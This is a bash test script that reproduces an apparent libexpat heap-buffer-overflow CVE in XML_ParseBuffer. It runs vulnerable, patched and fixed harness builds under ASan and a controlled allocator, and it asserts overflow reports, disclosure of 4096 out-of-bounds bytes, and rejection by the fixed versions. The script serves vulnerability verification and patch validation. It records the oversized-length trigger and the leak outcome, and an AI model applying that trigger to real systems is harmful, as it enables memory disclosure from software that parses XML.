#!/bin/bash
# expatparsebuf2shell CVE-2026-77214 staged reproduction matrix.
# All execution is local and in-process; no sockets, no external probes.
# Vulnerable = libexpat 2.8.5; controls = 2.8.5 + upstream fix patch and 2.9.0.
set -uo pipefail
D="$(cd "$(dirname "$0")" && pwd)"
R="$D/runs"
mkdir -p "$R"
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -Eq -- "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3"; fi; }
hasnt() { if grep -Eq -- "$2" "$1" 2>/dev/null; then bad "$3"; else ok "$3"; fi; }

if [ ! -x "$D/harness-vuln-asan" ] || [ ! -x "$D/harness-fixed-asan" ] \
   || [ ! -x "$D/harness-vuln-arena-plain" ]; then
    bash "$D/bootstrap.sh" >"$R/bootstrap.log" 2>&1 || { echo 'FAIL bootstrap'; exit 1; }
fi

echo '=== pins ==='
for spec in \
  'vuln.tar.gz:920dde485e15eda0cce8d2310b41d492c534e5e3d89ad407a0b4176dd2ff88fe' \
  'fixed.tar.gz:16afbb9cefead2aa278105cf27d9f597bde7fbf3dbb85015857ca7ca6a4e89ba' \
  'fix.patch:4eb9303e4effff1ad096c8e7d627374982390385fbd5458b66401b3270c1c1df'; do
    f="${spec%%:*}"; want="${spec##*:}"
    got=$(sha256sum "$D/pins/$f" | cut -d' ' -f1)
    if [ "$got" = "$want" ]; then ok "pin $f sha256"; else bad "pin $f sha256 got $got"; fi
done
has "$D/vuln/lib/xmlparse.c" 'm_bufferEnd \+= len;' '2.8.5 sink advances m_bufferEnd unchecked'
hasnt "$D/vuln/lib/xmlparse.c" '^  if \(len > EXPAT_SAFE_PTR_DIFF\(parser->m_bufferLim, parser->m_bufferEnd\)\) \{$' '2.8.5 has no capacity guard at sink'
has "$D/patched/lib/xmlparse.c" 'len > EXPAT_SAFE_PTR_DIFF\(parser->m_bufferLim, parser->m_bufferEnd\)' 'patched sink has capacity guard'
has "$D/fixed/lib/xmlparse.c" 'len > EXPAT_SAFE_PTR_DIFF\(parser->m_bufferLim, parser->m_bufferEnd\)' 'official 2.9.0 has capacity guard'

echo '=== ASan differential (real parser) ==='
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
(cd "$D" && ./harness-vuln-asan 4096 8192 90 >"$R/vuln-asan-attack.out" 2>&1); va=$?
[ "$va" -ne 0 ] && ok 'vulnerable ASan attack rc!=0' || bad 'vulnerable ASan attack rc'
has "$R/vuln-asan-attack.out" 'AddressSanitizer: heap-buffer-overflow' 'ASan heap-buffer-overflow'
has "$R/vuln-asan-attack.out" 'READ of size 1' 'ASan READ of size 1'
has "$R/vuln-asan-attack.out" 'XML_ParseBuffer vuln/lib/xmlparse.c:2464' 'ASan sink frame XML_ParseBuffer:2464'
has "$R/vuln-asan-attack.out" 'doContent vuln/lib/xmlparse.c:3303' 'ASan processor frame doContent:3303'
has "$R/vuln-asan-attack.out" '0 bytes after 4096-byte region' 'ASan 4096-byte region boundary'
has "$R/vuln-asan-attack.out" 'XML_GetBuffer vuln/lib/xmlparse.c:2598' 'ASan allocation frame XML_GetBuffer:2598'
(cd "$D" && ./harness-vuln-asan 4096 4096 90 >"$R/vuln-asan-safe.out" 2>&1); vs=$?
[ "$vs" -eq 0 ] && ok 'vulnerable ASan safe rc=0' || bad 'vulnerable ASan safe rc'
hasnt "$R/vuln-asan-safe.out" 'AddressSanitizer' 'vulnerable safe input ASan-clean'
for h in patched fixed; do
    (cd "$D" && ./harness-$h-asan 4096 8192 90 >"$R/$h-asan-attack.out" 2>&1); rc=$?
    [ "$rc" -eq 0 ] && ok "$h ASan attack rc=0" || bad "$h ASan attack rc"
    hasnt "$R/$h-asan-attack.out" 'AddressSanitizer' "$h attack ASan-clean"
    has "$R/$h-asan-attack.out" 'error=41' "$h attack returns XML_ERROR_INVALID_ARGUMENT"
done

echo '=== chosen-byte readback (controlled allocator, real parser) ==='
unset ASAN_OPTIONS
for seed in 90 107; do
    out="$R/vuln-arena-$seed.out"
    (cd "$D" && ./harness-vuln-arena-plain 4096 8192 "$seed" >"$out" 2>&1); rc=$?
    [ "$rc" -eq 0 ] && ok "vuln arena seed $seed rc=0" || bad "vuln arena seed $seed rc"
    has "$out" 'cdata_len=8189' "seed $seed reads 8189 character bytes"
    has "$out" 'tail_seed_count=4096' "seed $seed discloses 4096 chosen bytes past buffer"
    hex=$(printf '%02x' "$seed")
    has "$out" "tail=$hex$hex$hex$hex" "seed $seed tail is chosen bytes"
done
(cd "$D" && ./harness-vuln-arena-plain 4096 4096 90 >"$R/vuln-arena-safe.out" 2>&1); rc=$?
[ "$rc" -eq 0 ] && ok 'vuln arena safe rc=0' || bad 'vuln arena safe rc'
has "$R/vuln-arena-safe.out" 'cdata_len=4093' 'safe input reads only requested bytes'
has "$R/vuln-arena-safe.out" 'tail_seed_count=0' 'safe input discloses no chosen bytes'
for h in patched fixed; do
    (cd "$D" && ./harness-$h-arena-plain 4096 8192 90 >"$R/$h-arena-attack.out" 2>&1); rc=$?
    [ "$rc" -eq 0 ] && ok "$h arena attack rc=0" || bad "$h arena attack rc"
    has "$R/$h-arena-attack.out" 'error=41' "$h arena attack rejects len"
    has "$R/$h-arena-attack.out" 'cdata_len=0' "$h arena attack reads no bytes"
    has "$R/$h-arena-attack.out" 'tail_seed_count=0' "$h arena attack discloses no chosen bytes"
done

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
